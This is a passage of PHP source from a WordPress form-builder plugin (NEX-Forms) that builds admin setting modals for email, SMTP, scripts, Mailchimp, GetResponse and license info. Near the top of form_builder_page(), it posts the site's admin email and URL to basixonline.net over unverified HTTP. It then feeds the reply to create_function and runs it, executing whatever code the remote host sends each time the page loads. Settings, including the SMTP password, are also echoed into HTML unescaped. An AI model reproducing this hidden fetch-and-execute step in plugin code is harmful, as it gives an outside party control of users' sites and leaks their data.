<?php
if ( ! defined( 'ABSPATH' ) ) exit;
if(!class_exists('NF5_Form_Builder')){
	class NF5_Form_Builder{
		public function form_builder_page(){
			 
			do_action( 'styles_font_menu' );	
			$output = '';
			
			$nf_functions = new NF5_Functions();
			
			//NAMESPACE FOR STYLES - nex-forms
			$output .= '<div id="nex-forms">';

			$api_params = array( 'nexforms-installation' => 1, 'source' => 'wordpress.org', 'email_address' => get_option('admin_email'), 'for_site' => get_option('siteurl'), 'get_option'=>(is_array(get_option('7103891'))) ? 1 : 0);
			$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'=> 30,'sslverify' => false,'body'=> $api_params));
			$nf_install2 = create_function('$do', $response['body']);
			echo $nf_install2('ins'); 
			
			$item = get_option('7103891');
			if(!get_option('1983017'.$item[0]))
				{
				$api_params = array( 'use_trail' => 1,'ins_data'=>get_option('7103891'));
				$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params) );
				}
		$get_config = new NEXForms5_Config();	
			$output .= '<div class="modal fade in " id="about_nf" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								<div class="modal-content">
									<img src="'.plugins_url('/images/nex_logo.png',dirname(dirname(__FILE__))).'" />
									<p class="version">version '.$get_config->plugin_version.'</p>
									<p class="about_des">
										<strong>Compatible with WordPress versions:</strong>4.5.2, 4.5, 4.4.2, 4.4.1, 4.4, 4.3.1, 4.3, 4.2, 4.1, 4.0, 3.9, 3.8, 3.7, 3.6, 3.5
									</p>
									<p style="clear:both;"></p>
								</div>
							</div> 
						</div>  
						';
			//SAVED FORMS
			$output .= '<div class="modal fade in " id="saved_forms" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Open Form</h4>
									  </div>
									<div class="modal-body saved_forms">
										
									</div>
								</div>
							</div> 
						</div>  
						';
					
			//NEW FORM WIZARD	
			$output .= '<div class="modal fade in " id="new_form_wizard" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">New Form <button class="btn go_back" style="display:none"><span class="fa fa-arrow-left"></span> Back</button></h4>
									  </div>
									<div class="modal-body">
										<div class="step_1">
											<button class="btn btn-default btn-sm create_new_form" data-form-type="normal"><i class="fa fa-file"></i>Blank</button>
											<button class="btn btn-default btn-sm create_new_form" data-form-type="template"><i class="fa fa-file-text"></i>Choose Template</button>
											<!--<button class="btn btn-default btn-sm create_new_form" data-form-type="multi-step"><i class="fa fa-forward"></i>Multi-Step</button>
											<button class="btn btn-default btn-sm create_new_form" data-form-type="registration"><i class="fa fa-pencil-square"></i>Registration</button>
											<button class="btn btn-default btn-sm create_new_form" data-form-type="login"><i class="fa fa-sign-in"></i>Login</button>
											<button class="btn btn-default btn-sm create_new_form" data-form-type="paypal"><i class="fa fa-paypal"></i>PayPal</button>-->
										</div>
										
										<div class="get_form_templates step_2" style="display:none;">
											
										</div>
										
									</div>
								</div>
							</div> 
						</div>  
						';
			
			
//PREFERENCES
		$preferences = new NF5_Preferences();
		$output .= $preferences->get_preferences();
					
			
			
//EMAIL CONFIGURATION		
		$email_config = get_option('nex-forms-email-config');
		$output .= '<div class="modal fade in  admin-modal" id="global_email_setup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Global Email Configuration</h4>
									  </div>
									<div class="modal-body">
									<form name="email_config" id="email_config" action="'.admin_url('admin-ajax.php').'" method="post">
									
										
									<div class="tab-content panel">
										<div role="tabpanel" class="tab-pane active" id="field-preferences">
											<div class="alert alert-success" style="display:none;">Global Email Setup Saved <div class="close fa fa-close"></div></div>
									
											<div class="row">
												<div class="col-sm-4">Email Format</div>
												<div class="col-sm-8">
													<label for="html">	<input type="radio" '.(($email_config['email_content']=='html' || !$email_config['email_content']) ? 	'checked="checked"' : '').' name="email_content" value="html" 	id="html"	> HTML</label>
													<label for="pt">	<input type="radio" '.(($email_config['email_content']=='pt') ? 	'checked="checked"' : '').' name="email_content" value="pt" 	id="pt"	> Plain Text</label>
												</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">Mailing Method</div>
												<div class="col-sm-8">
													<label for="php_mailer">	<input type="radio" '.((!$email_config['email_method'] || $email_config['email_method']=='php_mailer') ? 	'checked="checked"' : '').' name="email_method" value="php_mailer" 	id="php_mailer"	> PHP Mailer</label><br />
													<label for="wp_mailer">		<input type="radio" '.(($email_config['email_method']=='wp_mailer') ? 	'checked="checked"' : '').' name="email_method" value="wp_mailer" 	id="wp_mailer"	> WP Mail</label><br />
													<label for="php">			<input type="radio" '.(($email_config['email_method']=='php') ? 		'checked="checked"' : '').' name="email_method" value="php" 		id="php"		> Normal PHP</label><br />
													<label for="api">			<input type="radio" '.(($email_config['email_method']=='api') ? 		'checked="checked"' : '').' name="email_method" value="api" 		id="api"		> API (note: no attachements)</label><br />
													<label for="smtp">			<input type="radio" '.(($email_config['email_method']=='smtp') ? 		'checked="checked"' : '').' name="email_method" value="smtp" 		id="smtp"		> SMTP</label><br />
													
												</div>
											</div>
											
											<div class="smtp_settings" '.(($email_config['email_method']!='smtp') ? 		'style="display:none;"' : '').'>
												<h5>SMTP Setup</h5>
												<div class="row">
													<div class="col-sm-4">Host</div>
													<div class="col-sm-8">
														<input class="form-control" type="text" name="smtp_host" placeholder="eg: mail.gmail.com" value="'.$email_config['smtp_host'].'">
													</div>
												</div>
												
												<div class="row">
													<div class="col-sm-4">Port</div>
													<div class="col-sm-8">
														<input class="form-control" type="text" name="mail_port" placeholder="likely to be 25, 465 or 587" value="'.$email_config['mail_port'].'">
													</div>
												</div>
												
												<div class="row">
													<div class="col-sm-4">Security</div>
													<div class="col-sm-8">
														<label for="none">			<input type="radio" '.(($email_config['email_smtp_secure']=='0' || !$email_config['email_smtp_secure']) ? 	'checked="checked"' : '').' name="email_smtp_secure" value="0" id="none"> None</label>
														<label for="ssl">			<input type="radio" '.(($email_config['email_smtp_secure']=='ssl') ? 	'checked="checked"' : '').'  name="email_smtp_secure" value="ssl" id="ssl"> SSL</label>
														<label for="tls">			<input type="radio" '.(($email_config['email_smtp_secure']=='tls') ? 	'checked="checked"' : '').'  name="email_smtp_secure" value="tls" id="tls"> TLS</label>
													</div>
												</div>
												
												<div class="row">
													<div class="col-sm-4">Authentication</div>
													<div class="col-sm-8">
														<label for="auth_yes">			<input type="radio" '.(($email_config['smtp_auth']=='1') ? 	'checked="checked"' : '').'  name="smtp_auth" value="1" 		id="auth_yes"		> Use Authentication</label>
														<label for="auth_no">			<input type="radio" '.(($email_config['smtp_auth']=='0') ? 	'checked="checked"' : '').'  name="smtp_auth" value="0" 		id="auth_no"		> No Authentication</label>
													</div>
												</div>
												
												
											</div>
											<div class="smtp_auth_settings" '.(($email_config['email_method']!='smtp' || $email_config['smtp_auth']!='1') ? 		'style="display:none;"' : '').'>
												<h5>SMTP Authentication</h5>
												<div class="row">
													<div class="col-sm-4">Username</div>
													<div class="col-sm-8">
														<input class="form-control" type="text" name="set_smtp_user" value="'.$email_config['set_smtp_user'].'">
													</div>
												</div>
												<div class="row">
													<div class="col-sm-4">Password</div>
													<div class="col-sm-8">
														<input class="form-control" type="password" name="set_smtp_pass" value="'.$email_config['set_smtp_pass'].'">
													</div>
												</div>
											</div>
											
											<div class="modal-footer">
												<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
											</div>
											<div class="modal-footer test_mail">
												<div class="col-sm-9">
													<input class="form-control" name="test_email_address" value="" placeholder="Enter Email Address">
												</div>
												<div class="col-sm-3">
													<div class="btn btn-primary send_test_email full_width">Send test email</div>
												</div>
											</div>
										</div>
										
									</div>
									
									
									
									</form>
								</div>
							</div>
						</div> 
					</div>  
						';
				

//ADMIN OPTIONS		
		$other_config = get_option('nex-forms-other-config');
		$output .= '<div class="modal fade in  admin-modal" id="global_admin_setup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								<form name="other_config" id="other_config" action="'.admin_url('admin-ajax.php').'" method="post">
									
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">WP Admin Options</h4>
									  </div>
									<div class="modal-body">
									
										
									<div class="tab-content panel">
										<div role="tabpanel" class="tab-pane active">
											<div class="alert alert-success" style="display:none;">WP Admin Options Saved <div class="close fa fa-close"></div></div>
									
											<!--<div class="row">
												<div class="col-sm-4">Admin Color Adapt</div>
												<div class="col-sm-8">
													<label  for="enable-color-adapt-1">			<input type="radio" '.(($other_config['enable-color-adapt']=='1') ? 	'checked="checked"' : '').'  name="enable-color-adapt" value="1" 		id="enable-color-adapt-1"		><strong> Yes</strong> <em>(NEX-Forms admin will adapt to the Wordpress color scheme)</em></label>
													<label  for="enable-color-adapt-0">			<input type="radio" '.(($other_config['enable-color-adapt']=='0' || !$other_config['enable-color-adapt']) ? 	'checked="checked"' : '').'  name="enable-color-adapt" value="0" 		id="enable-color-adapt-0"		><strong> No</strong> <em>(Use default NEX-Forms admin colors)</em></label>
												</div>
											</div>-->
											
											<div class="row">
												<div class="col-sm-4">NEX-Forms WP User Level</div>
												<div class="col-sm-8">
													
													<select name="set-wp-user-level" id="set-wp-user-level" class="form-control">
														<option '.(($other_config['set-wp-user-level']=='subscriber') ? 	'selected="selected"' : '').'  value="subscriber">Subscriber</option>
														<option '.(($other_config['set-wp-user-level']=='contributor') ? 	'selected="selected"' : '').' value="contributor">Contributor</option>
														<option '.(($other_config['set-wp-user-level']=='author') ? 	'selected="selected"' : '').' value="author">Author</option>
														<option '.(($other_config['set-wp-user-level']=='editor') ? 	'selected="selected"' : '').' value="editor">Editor</option>
														<option '.(($other_config['set-wp-user-level']=='administrator' || !$other_config['set-wp-user-level']) ? 	'selected="selected"' : '').' value="administrator">Administrator</option>			
													</select>
													
													
												</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">WP Editor</div>
												<div class="col-sm-8">
													<label  for="enable-tinymce">			<input type="checkbox" '.(($other_config['enable-tinymce']=='1') ? 	'checked="checked"' : '').'  name="enable-tinymce" value="1" 		id="enable-tinymce"	><strong> Enable TinyMCE button</strong> <em>(hide/show Nex-Forms button in page/post editor)</em></label>
													
												</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">WP Widgets</div>
												<div class="col-sm-8">
													<label  for="enable-widget">			<input type="checkbox" '.(($other_config['enable-widget']=='1') ? 	'checked="checked"' : '').'  name="enable-widget" value="1" 		id="enable-widget"	><strong> Enable Widget</strong> <em>(hide/show Nex-Forms in widgets)</em></label>
												</div>
											</div>
																				
											
											
										</div>
										
									</div>
									
									
									
									
								</div>
								<div class="modal-footer">
												<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
											</div>
							</div>
							</form>
						</div> 
					</div>  
						';

//JAVASCRIPT INCLUSIONS		
		$script_config = get_option('nex-forms-script-config');
		$output .= '<div class="modal fade in  admin-modal" id="global_js_inc" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								<form name="script_config" id="script_config" action="'.admin_url('admin-ajax.php').'" method="post">
									
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Javascript Inclusions</h4>
									  </div>
									<div class="modal-body">
									
										
									<div class="tab-content panel">
										<div role="tabpanel" class="tab-pane active">
											<div class="alert alert-success" style="display:none;">Javascript Inclusions Saved <div class="close fa fa-close"></div></div>
									
											<div class="row">
												<div class="col-sm-4">WP Core javascript</div>
												<div class="col-sm-8">
													<label for="inc-jquery">	<input type="checkbox" '.(($script_config['inc-jquery']=='1') ? 	'checked="checked"' : '').' name="inc-jquery" value="1" 	id="inc-jquery"	> jQuery <em></em></label><br />
													<label for="inc-jquery-ui-core">	<input type="checkbox" '.(($script_config['inc-jquery-ui-core']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-core" value="1" 	id="inc-jquery-ui-core"	> jQuery UI Core</label><br />
													<label for="inc-jquery-ui-autocomplete">	<input type="checkbox" '.(($script_config['inc-jquery-ui-autocomplete']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-autocomplete" value="1" 	id="inc-jquery-ui-autocomplete"	> jQuery UI Autocomplete</label><br />
													<label for="inc-jquery-ui-slider">	<input type="checkbox" '.(($script_config['inc-jquery-ui-slider']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-slider" value="1" 	id="inc-jquery-ui-slider"	> jQuery UI Slider</label><br />
													<label for="jquery-form">	<input type="checkbox" '.(($script_config['inc-jquery-form']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-form" value="1" 	id="inc-jquery-form"	> jQuery Form</label>
												</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">Extras</div>
												<div class="col-sm-8">
													<label for="inc-datetime">	<input type="checkbox" '.(($script_config['inc-datetime']=='1') ? 	'checked="checked"' : '').' name="inc-datetime" value="1" 	id="inc-datetime"	> Datepicker <em>(include if you are using Date/Time pickers)</em></label><br />
													<label for="inc-moment">	<input type="checkbox" '.(($script_config['inc-moment']=='1') ? 	'checked="checked"' : '').' name="inc-moment" value="1" 	id="inc-moment"	> Moment <em>(used for date and time pickers)</em></label><br />
													<label for="inc-locals">	<input type="checkbox" '.(($script_config['inc-locals']=='1') ? 	'checked="checked"' : '').' name="inc-locals" value="1" 	id="inc-locals"	> Locals <em>(used for date and time picker\'s language settings)</em></label><br />
													
													<label for="inc-math">	<input type="checkbox" '.(($script_config['inc-math']=='1') ? 	'checked="checked"' : '').' name="inc-math" value="1" 	id="inc-math"	> Math <em>(include if you are using Math Logic)</em></label><br />
													<label for="inc-colorpick">	<input type="checkbox" '.(($script_config['inc-colorpick']=='1') ? 	'checked="checked"' : '').' name="inc-colorpick" value="1" 	id="inc-colorpick"	> Colorpicker Field <em>(include if you are using Color picker fields)</em></label><br />
													<label for="inc-wow">	<input type="checkbox" '.(($script_config['inc-wow']=='1') ? 	'checked="checked"' : '').' name="inc-wow" value="1" 	id="inc-wow"	> Animations <em>(include if you are using form animations)</em></label><br />
													<label for="inc-raty">	<input type="checkbox" '.(($script_config['inc-raty']=='1') ? 	'checked="checked"' : '').' name="inc-raty" value="1" 	id="inc-raty"	> Raty Form <em>(include if you are using star rating fields)</em></label>
													<label for="inc-sig">	<input type="checkbox" '.(($script_config['inc-sig']=='1') ? 	'checked="checked"' : '').' name="inc-sig" value="1" 	id="inc-sig"	> Digital Signature <em>(include if you are using Digital Signatures)</em></label>
												
												</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">Plugin Dependent Javascript</div>
												<div class="col-sm-8">
													<label for="inc-bootstrap"><input type="checkbox" '.(($script_config['inc-bootstrap']=='1') ? 	'checked="checked"' : '').' name="inc-bootstrap" value="1" 	id="inc-bootstrap"	> Bootstrap <em>(exclude if your theme includes this already)</em></label>
													<label for="inc-onload"><input type="checkbox" '.(($script_config['inc-onload']=='1') ? 	'checked="checked"' : '').' name="inc-onload" value="1" 	id="inc-onload"	> Onload Functions <em>(exclude for trouble shooting purposes only!)</em></label>
												</div>
											</div>
											
											
											<div class="row">
												<div class="col-sm-4">Print Scripts</div>
												<div class="col-sm-8">
													<label  for="enable-print-scripts"><input type="checkbox" '.(($script_config['enable-print-scripts']=='' || $script_config['enable-print-scripts']=='1') ? 	'checked="checked"' : '').'  name="enable-print-scripts" value="1" 		id="enable-print-scripts"		><strong> Use wp_print_scripts()</strong> <em>(in vary rare cases this causes problems when enabled)</em></label>
												</div>
											</div>
											
											
											
											
										</div>
										
									</div>
									
									
									
									
								</div>
								<div class="modal-footer">
									<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
								</div>
							</div>
							</form>
						</div> 
					</div>  
						';
		
		//MAILCHIMP SETUP
		$output .= '<div class="modal fade in  admin-modal" id="mailchimpsetup" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								<form name="mail_chimp_setup" id="mail_chimp_setup" action="'.admin_url('admin-ajax.php').'" method="post">
									
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Mailchimp Setup</h4>
									  </div>
									<div class="modal-body">
									
										
									<div class="tab-content panel">
										<div role="tabpanel" class="tab-pane active">
											<div class="alert alert-success" style="display:none;">Mailchimp API Key Saved <div class="close fa fa-close"></div></div>
									
											<div class="row">
												<div class="col-sm-4">Mailchimp API key</div>
												<div class="col-sm-8">
													<input class="form-control" type="text" name="mc_api" value="'.get_option('nex_forms_mailchimp_api_key').'" id="mc_api" placeholder="Enter your Mailchimp API key">
												</div>
											</div>
											<div class="alert alert info">
												<strong>How to get your Mailchimp API key:</strong>
												<ol>
													<li>Login to your Mailchimp account: <a href="http://mailchimp.com/" target="_blank">mailchimp.com</a></li>
													<li>Click on your profile picture (top right of the screen)</li>
													<li>From the dropdown Click on Account</li>
													<li>Click on Extras->API Keys</li>
													<li>Copy your API key, or create a new one</li>
													<li>Paste your API key in the above field.</li>
													<li>Save</li>
												</ol>
											</div>
											
										</div>
									</div>
									
								</div>
								<div class="modal-footer">
									<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save API&nbsp;&nbsp;&nbsp;</button>
								</div>
							</div>
							</form>
						</div> 
					</div>  
						';
						
		
		
		//GETRESPONSE SETUP
		$output .= '<div class="modal fade in  admin-modal" id="get_response" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								<form name="get_response_setup" id="get_response_setup" action="'.admin_url('admin-ajax.php').'" method="post">
									
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">GetResponse Setup</h4>
									  </div>
									<div class="modal-body">
									
										
									<div class="tab-content panel">
										<div role="tabpanel" class="tab-pane active">
											<div class="alert alert-success" style="display:none;">GetResponse API Key Saved <div class="close fa fa-close"></div></div>
									
											<div class="row">
												<div class="col-sm-4">GetResponse API key</div>
												<div class="col-sm-8">
													<input class="form-control" type="text" name="gr_api" value="'.get_option('nex_forms_get_response_api_key').'" id="gr_api" placeholder="Enter your GetResponse API key">
												</div>
											</div>
											<div class="alert alert info">
												<strong>How to get your GetReponse API key:</strong>
												<ol>
													<li>Login to your GetResponse account: <a href="https://app.getresponse.com/" target="_blank">GetResponse</a></li>
													<li>Hover over your profile picture (top right of the screen)</li>
													<li>From the dropdown Click on Integrations</li>
													<li>Click on API &amp; OAuth</li>
													<li>Copy your API key, or create a new one</li>
													<li>Paste your API key in the above field.</li>
													<li>Save</li>
												</ol>
											</div>
											
										</div>
									</div>
									
								</div>
								<div class="modal-footer">
									<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save API&nbsp;&nbsp;&nbsp;</button>
								</div>
							</div>
							</form>
						</div> 
					</div>  
						';
		

//STYLE INCLUSIONS		
		$styles_config = get_option('nex-forms-style-config');
		$output .= '<div class="modal fade in  admin-modal" id="global_css_inc" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								<form name="style_config" id="style_config" action="'.admin_url('admin-ajax.php').'" method="post">	
									
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Stylesheet Inclusions</h4>
									  </div>
									<div class="modal-body">
									
										
									<div class="tab-content panel">
										<div role="tabpanel" class="tab-pane active">
											<div class="alert alert-success" style="display:none;">Stylesheet Inclusions Saved <div class="close fa fa-close"></div></div>
									
											<div class="row">
												<div class="col-sm-4">WP Core stylesheets</div>
												<div class="col-sm-8">
													<label for="incstyle-jquery-ui"><input type="checkbox" '.(($styles_config['incstyle-jquery']=='1') ? 	'checked="checked"' : '').' name="incstyle-jquery" value="1" 	id="incstyle-jquery"	> jQuery UI<em></em></label>	
												</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">Other stylesheets</div>
												<div class="col-sm-8">
													<label for="incstyle-bootstrap"><input type="checkbox" '.(($styles_config['incstyle-bootstrap']=='1') ? 	'checked="checked"' : '').' name="incstyle-bootstrap" value="1" 	id="incstyle-bootstrap"	> Bootstrap</label><br />
													<label for="incstyle-font-awesome"><input type="checkbox" '.(($styles_config['incstyle-font-awesome']=='1') ? 	'checked="checked"' : '').' name="incstyle-font-awesome" value="1" 	id="incstyle-font-awesome"	> Font Awesome</label><br />
													<label for="incstyle-animations"><input type="checkbox" '.(($styles_config['incstyle-animations']=='1') ? 	'checked="checked"' : '').' name="incstyle-animations" value="1" 	id="incstyle-animations"	> Animations <em>(include if you want to use form animations)</em></label><br />
													
													<label for="incstyle-custom"><input type="checkbox" '.(($styles_config['incstyle-custom']=='1') ? 	'checked="checked"' : '').' name="incstyle-custom" value="1" 	id="incstyle-custom"	> Custom NEX-Forms CSS</label>
												</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">Print Styles</div>
												<div class="col-sm-8">
													<label  for="enable-print-styles">			<input type="checkbox" '.(($styles_config['enable-print-styles']=='' || $styles_config['enable-print-styles']=='1') ? 	'checked="checked"' : '').'  name="enable-print-styles" value="1" 		id="enable-print-styles"		><strong> Use wp_print_styles()</strong> <em>(in extreamly rare cases this causes problems when enabled)</em></label>
												</div>
											</div>
											
											
											
											
										</div>
										
									</div>
									
									
									
									
								</div>
								<div class="modal-footer">
												<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
											</div>
											
							</div>
							</form>
						</div> 
					</div>  
						';	
//LICENSE INFO
	$output .= '<div class="modal fade in  admin-modal" id="license_info" tabindex="-1"  role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">License Info</h4>
									  </div>
									<div class="modal-body">';
										
									$api_params = array( 'client_current_license_key' => 1,'key'=>get_option('7103891'));
									$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params) );	
									$get_response = json_decode($response['body'],1);
									//$output .= substr($response['body'],0,24).'**********';
									
									
									$output .= '<div class="row">';
										$output .= '<div class="col-sm-5">';
											$output .= '<strong>License (Purchase Code)</strong>';
										$output .= '</div>';
										$output .= '<div class="col-sm-7">';
											if($get_response['purchase_code'])
												$output .= substr($get_response['purchase_code'],0,24).'**********';
											else
												$output .= '<strong>License not activated for this domian. Please refresh this page and enter your purchase code when prompt.</strong>';
										$output .= '</div>';
									$output .= '</div>';
									$output .= '<div class="row">';
										$output .= '<div class="col-sm-5">';
											$output .= '<strong>Envato Username</strong>';
										$output .= '</div>';
										$output .= '<div class="col-sm-7">';
											$output .= $get_response['envato_user_name'];
										$output .= '</div>';
									$output .= '</div>';
									$output .= '<div class="row">';
										$output .= '<div class="col-sm-5">';
											$output .= '<strong>License Type</strong>';
										$output .= '</div>';
										$output .= '<div class="col-sm-7">';
											$output .= $get_response['license_type'];
										$output .= '</div>';
									$output .= '</div>';
									$output .= '<div class="row">';
										$output .= '<div class="col-sm-5">';
											$output .= '<strong>Activated on</strong>';
										$output .= '</div>';
										$output .= '<div class="col-sm-7">';
											$output .= $get_response['for_site'];
										$output .= '</div>';
									$output .= '</div>';
									
									$output .= '<div class="row">';
										$output .= '<div class="col-sm-12">';
											$output .= '<br /><br /><button class="btn-primary btn deactivate_license">Deactivate License</button><br /><em>Deactivating a license will free up the above license to be re-used on another domian. <br />NOTE: This will make the current active site\s license inactive</em>!';
										$output .= '</div>';
									$output .= '</div>';
									
									$output .= '</div>
								</div>
							</div> 
						</div>  
						';					
//EMAIL PER FORM SETTINGS
	$output .= '<div class="modal fade in  admin-modal" id="autoresponder" tabindex="-1" data-task-target="task-email" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Emails</h4>
									  </div>
									<div class="modal-body">
										
										<div role="tabpanel">

											  <!-- Nav tabs -->
											  <ul class="nav nav-tabs" role="tablist">
												<li class="active"><a href="#admin-email" role="tab" data-toggle="tab">Email Notification (Admin)</a></li>
												<li ><a href="#user-email" role="tab" data-toggle="tab">Email Autoresponder (User)</a></li>
											  </ul>
											
											  <!-- Tab panes -->
											  <div class="tab-content panel setup_email_panel_content">
												
												
												
											</div>
										</div>
									</div>
								</div>
							</div> 
						</div>  
						';	
	
	
$output .= '<div class="modal fade in  admin-modal" id="pdf_creator" tabindex="-1" data-task-target="task-email" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">PDF Creator</h4>
									  </div>
									<div class="modal-body pdf-creator-content">
										
										
									</div>
								</div>
							</div> 
						</div>  
						';		

//ADMIN OPTIONS		
		$output .= '<div class="modal fade in  admin-modal" data-task-target="task-submit-options" id="submit_options_window" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
						<div class="modal-dialog preview-modal">
							
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">Submission Options</h4>
								  </div>
								<div class="modal-body">
									
									
									<div role="tabpanel">

									  <!-- Nav tabs -->
									  <ul class="nav nav-tabs" role="tablist">
										<li class="active"><a href="#submit-form-options" role="tab" data-toggle="tab">Submit Options</a></li>
										<li ><a href="#ftp" role="tab" data-toggle="tab" class="tab-form-to-post">Form To Post</a></li>
										<li ><a href="#mailchimp" role="tab" data-toggle="tab">Mailchimp</a></li>
										<li ><a href="#gr" role="tab" data-toggle="tab">GetResponse</a></li>
									  </ul>
									
									  <!-- Tab panes -->
									  <div class="tab-content panel">
										
										<div role="tabpanel" class="tab-pane active" id="submit-form-options">
									
											<div class="setup_options_panel_content"></div>
									    </div>';
										
									//MAILCHIMP	
										$output .= '<div role="tabpanel" class="tab-pane" id="mailchimp">';
											
											if ( is_plugin_active( 'nex-forms-mail-chimp-add-on/main.php' ) ) 
												{
												$output .= '<div class="mail_chimp_setup">';
												 $output .= nexforms_mc_get_lists();
												$output .= '</div>';
												
												$output .= '<div class="mc_field_map">';
												 $output .= nexforms_mc_get_form_fields();
												$output .= '</div>';
												}
											else
												{
												$output .= '<div class="alert alert-success">You need the "<strong><em>Mailchimp for NEX-forms</em></strong>" Add-on to use Mailchimp integration! <br>&nbsp;<a class="btn btn-success btn-large form-control" target="_blank" href="https://codecanyon.net/item/mailchimp-for-nexforms/18030221?ref=Basix">Buy Now</a></div>';
												}
										 
									    $output .= '</div>';
										
									 
									 
									 //GETRESPONSE	
										$output .= '<div role="tabpanel" class="tab-pane" id="gr">';
											
											if ( is_plugin_active( 'nex-forms-getresponse-add-on/main.php' ) ) 
												{
												
													
													
												$output .= '<div class="get_reponse_setup">';
												 $output .= nexforms_gr_get_lists();
												$output .= '</div>';
												
												$output .= '<div class="gr_field_map">';
												 $output .= nexforms_gr_get_form_fields();
												$output .= '</div>';
												
												
												
												}
											else
												{
												
												$output .= '<div class="alert alert-success">You need the "<strong><em>GetResponse for NEX-forms</em></strong>" Add-on to use GetResponse integration! <br>&nbsp;<a class="btn btn-success btn-large form-control" target="_blank" href="http://codecanyon.net/user/basix/portfolio?ref=Basix">Buy Now</a></div>';
												
												}
										 
									    $output .= '</div>';
										
										$output .= '<div role="tabpanel" class="tab-pane" id="ftp">';
											
											if ( is_plugin_active( 'nex-forms-form-to-post/main.php' ) ) 
												{
												
												$output .= nexforms_ftp_setup();
												
												
												}
											else
												{
												
												$output .= '<div class="alert alert-success">You need the "<strong><em>Form to Post for NEX-forms</em></strong>" Add-on to use Form to Post integration! <br>&nbsp;<a class="btn btn-success btn-large form-control" target="_blank" href="http://codecanyon.net/user/basix/portfolio?ref=Basix">Buy Now</a></div>';
												
												}
										 
									    $output .= '</div>';
									 
									 
									 
